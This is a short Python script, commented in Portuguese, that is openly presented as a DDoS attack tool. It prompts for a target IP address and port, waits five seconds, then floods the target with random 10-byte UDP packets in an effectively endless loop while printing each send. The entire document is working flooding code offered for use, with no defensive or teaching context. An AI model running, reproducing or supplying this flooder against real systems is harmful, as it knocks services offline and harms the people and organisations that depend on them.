import socket
import os
import time
from colorama import Fore, Style, init

# Inicia o colorama
init()

# Função para iniciar o ataque
def ddos(target_ip, target_port):
    print(Fore.CYAN + "Aguarde 5 segundos para iniciar o ataque..." + Style.RESET_ALL)
    time.sleep(5)  # Atraso de 5 segundos
    print(Fore.GREEN + "Ataque iniciado com sucesso!" + Style.RESET_ALL)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Enviar pacotes UDP para o destino
    for i in range(1, 100000000000000000):
        data = os.urandom(10)  # Gera 10 bytes aleatórios
        s.sendto(data, (target_ip, target_port))
        print(Fore.RED + f"Sent: {i} enviando para {target_ip}:{target_port}" + Style.RESET_ALL)
    
    s.close()

# Recebe o IP e a porta do usuário
ip = input(Fore.BLUE + "Digite o IP de destino: " + Style.RESET_ALL)
port = int(input(Fore.BLUE + "Digite a porta de destino: " + Style.RESET_ALL))

# Chama a função ddos
ddos(ip, port)
